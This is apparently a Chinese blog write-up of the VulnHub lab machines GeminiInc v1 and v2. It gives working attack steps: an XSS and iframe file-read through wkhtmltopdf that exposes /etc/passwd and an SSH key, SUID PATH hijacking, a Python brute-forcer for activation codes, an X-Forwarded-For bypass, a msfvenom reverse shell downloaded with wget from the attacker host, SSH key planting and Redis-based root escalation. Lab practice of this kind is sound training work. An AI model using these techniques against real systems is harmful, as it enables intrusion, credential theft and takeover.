---
title: vulnhub-GeminiInc
tags:
  - vulnhub
  - 练习记录
  - 渗透测试
date: 2018-9-14 14:39:37
---


# 前言

最近和组内大佬一起刷的vulnhub，`GeminiInc`有v1和v2两个版本，感觉有很多新奇的东西，遂单独拿出来记录一下



# GeminiInc V1

## 主机探测

`arp-scan -l`探测一手ip信息，检测到靶机ip为`192.168.85.142`

nmap探测一波端口信息

```shell
nmap -sS -T4 -A -v 192.168.85.142
```

![](vulnhub-GeminiInc\1.png)

开了常规的`22`和`80`端口

## web attack

访问80端口后是个监听的目录，只有一个`test2`目录，进去就是了

![](vulnhub-GeminiInc\2.png)

给出了一个建站模板的github地址

分析一波之后可以在`install.php`中看到默认的管理员账号密码

![](vulnhub-GeminiInc\3.png)

可以尝试用这个默认的管理员账号密码登录一下，发现刚好可以登录！



登录之后可以看到有两个功能模块，修改资料和导出资料

![](vulnhub-GeminiInc\4.png)

导出的资料就是个人界面的一个pdf

![](vulnhub-GeminiInc\5.png)

在二进制流中可以发现是用`wkhtmltopdf`生成的pdf文件

![](vulnhub-GeminiInc\6.png)



在修改资料中我们可以完全控制的有一个`display name`字段，尝试插入一些`script`字段发现也可以成功插入

```html
<script>alert(/xss/)</script>
```

![](vulnhub-GeminiInc\7.png)

这样的话，感觉接下来应该是插入一些特殊的标签，来攻击靶机

但是，我尝试了所有我能想到的攻击方式，却起不了一点作用，于是看了下别人的writeup

首先现在自己的www目录下写入这样一个php文件，

1.php

```php
<?php
$filename = $_GET['file'];
header("Location: file://$filename");
```

然后在`display name`字段中插入

```html
<iframe src="http://192.168.85.134/1.php?file=/etc/passwd" width="100%" height=1220></iframe>
```

导出pdf之后，就能看到，读取出了靶机中的`/etc/passwd`文件

![](vulnhub-GeminiInc\8.png)

至于具体原理，可以看https://github.com/wkhtmltopdf/wkhtmltopdf/issues/3570

应该是出题人自己挖的一个0day，只能说太强了orz



这样的话我们就可以进一步读取`gemini1`用户`/home/gemini1/.ssh/id_rsa`文件，来通过私钥登录靶机

![](vulnhub-GeminiInc\9.png)

这里直接在linux上通过`ssh -i`方式登录似乎会有一点格式问题，但是通过xshell导入私钥文件登录就不会出现问题

## suid提权

一般低权限登录进去首先就是查看下系统版本，看看有没有什么能提权的脚本

![](vulnhub-GeminiInc\10.png)

比较尴尬的就是，linux版本相当高了，找了半天没有找到对应版本的提权，稍微看了下writeup是通过suid提权

> **SUID**（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。

具体原理可以参照下 https://www.anquanke.com/post/id/86979

查看一下具有SUID或4000权限的文件。

```shell
find / -perm -u=s -type f 2>/dev/null
```

![](vulnhub-GeminiInc\11.png)

运行一下可以发现这里面运行了`date`命令

![](vulnhub-GeminiInc\12.png)

这个文件的所有者为`root`，这样我们就可以修改环境变量中的`date`命令来以root的身份执行想要执行的代码

```shell
cd /tmp
echo "/bin/sh" > date
chmod 777 date
echo $PATH
export PATH=/tmp:$PATH
/usr/bin/listinfo
```

![](vulnhub-GeminiInc\13.png)

这样就借助suid的权限切换，成功获得到了root权限，最后的flag

![](vulnhub-GeminiInc\14.png)



# GeminiInc V2

## 主机探测

虽然说V2是V1的升级版，但是似乎没有太大的关系，一开始还是一波ip探测和nmap的端口扫描

还是常规的22和80，这里有一个比较重要的点就是目录扫描

在实际的跳转链接中，就只有`index.php`和`login.php`两个和界面，所以需要一个比较全的字典来扫描

```shell
dirb http://192.168.85.140 SVNDigger/all.txt
```

![](vulnhub-GeminiInc\15.png)

两个比较重要的文件就是`activate.php`和`registration.php`

## 用户登录

在`registration.php`中可以申请一个用户

注册完之后会有提示说需要一个六位数的邀请码

![](vulnhub-GeminiInc\16.png)

在激活页面`activate.php`中需要输入激活用户的id，就可以通过访问`My Profile`后在url处获取用户id

![](vulnhub-GeminiInc\17.png)

至于六位数的邀请码，这个可能需要写一个脚本来爆破，由于六位确实有点长，出题人也只给了一个三位数值的六位数邀请码，方便爆破

```python
import requests
import re
import threading
url = "http://192.168.85.140/activate.php"

def get_code():
	for i in range(1000000):
		l = len(str(i))
		if l<6:	
			yield '0'*(6-l)+str(i)
		else:
			yield str(i)

def get_token():
	cookies = dict(PHPSESSID="6bc1s35thd0glrft571gfud8c0")
	r = requests.get(url, cookies=cookies)

	token = re.search(r"[0-9a-f]{40}", r.text)
	if token is not None:
		return token.group(0)
	else:
		raise ValueError("can not find token")

def submit(code):
	data = dict(userid="17",activation_code=code,token=get_token())
	cookies = dict(PHPSESSID="6bc1s35thd0glrft571gfud8c0")
	r = requests.post(url , data=data, proxies = {
	"http": "http://127.0.0.1:8080",
	"https": "http://127.0.0.1:8080"}, cookies=cookies)
	

	if r.status_code == 403:
		print('[{}] => {}'.format(r.status_code, code))
		# print(r.headers)
	else:
		print('[{}] => {}'.format(r.status_code, code))
		exit()

for code in get_code():
	submit(code)
```

在`000511`的时候就可以确认成功登录

![](vulnhub-GeminiInc\18.png)

## 命令执行

进去之后，试了一下V1的常规操作，发现已经对html字符进行了实体编码

然后在查看源代码的时候无意中看到了被注释的密码哈希

![](vulnhub-GeminiInc\19.png)

这样，我们访问`/profile.php?u=1`就可以或得到管理员的密码哈希

![](vulnhub-GeminiInc\20.png)



在管理员登录后台中就多了一个`Admin Panel`模块里面有`Execute Command`，可是访问的时候却被禁止了

![](vulnhub-GeminiInc\21.png)

用burp拦截包之后可以看到是ip被禁止了

![](vulnhub-GeminiInc\22.png)

没想到设置了一波ctf中最常见的XFF就成功登录进去了

尝试执行了一些命令，发现`<`，`>` ，`|`,`\`还有空格一些符号被禁止了

这样的话空格可以用tab键来替代，然后尝试执行shell反弹

在本地用`msfvenom`生成一个反弹脚本，放在www目录下

```shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.85.134 LPORT=8888 -f elf -o rev
```

并监听本地8888端口

```
nc -lnvp 8888
```



然后在靶机中下载该文件并执行

```shell
wget	-O	/tmp/rev	192.168.85.134/rev
chmod	777	/tmp/rev
/tmp/rev
```

![](vulnhub-GeminiInc\23.png)

此时shell就反弹到了kali中，但是是一个交互性极差的shell，所以尝试写入私钥通过私钥登录

在本地`ssh-keygen -t rsa`后，将`/root/.ssh/id_rsa_pub`中的值放入靶机中的`/home/gemini1/.ssh/authorized_keys`中

```shell
cd /home/gemini1
mkdir .ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7/vRIIw5g42JZpNFiZ96w2aRZhEzYQclqXMaw0j8Me7oPh8EGrmzYNz7fNUoUtkg8ebcGRHAA1zfpyHlL/A1BIqiGIvYtq/Xy+g9Zkle6l4zMxvwDfnfrqoyrJLYpxLh8NjzqkO2wWOoFJYNg1QCUXAvkiaZgoyJXUiUdP6ZPk0a5HGDEoZNCxYMo7QnxMAfdo24Qo+rzDrimbUMkXe76w2xxi1YhulVFGdX8daiG8X/oNInSWHuyOD9Q5DRpgjv5MPY4exTiVgDA9l2gn/Qk9ZlOnC0YxZXgZZxzJBH2rRGeCt+xjV13IQ0sFmIh3LenfM7RcvBof6P58WBiS2Cv root@kali
" > /home/gemini1/.ssh/authorized_keys
```

然后在kali中`ssh -i id_rsa gemini1@192.168.85.140`链接即可

## 提权权限

和之前的V1一样，依旧是版本过高没有现成的提权脚本，看了开启的服务，有一个以roott权限运行的redis

![](vulnhub-GeminiInc\24.png)

那就尝试一下常规的redis未授权访问的套路，可是似乎是已授权的

![](vulnhub-GeminiInc\25.png)

最后在搜索引擎的帮助下，在配置文件中找到了redis密码

![](vulnhub-GeminiInc\26.png)

然后就改公钥走一波

![](vulnhub-GeminiInc\27.png)

私钥登录，cat flag

![](vulnhub-GeminiInc\28.png)







# Reference Links

https://hackso.me/gemini-inc-1-walkthrough/

https://hackso.me/gemini-inc-v2-walkthrough/























































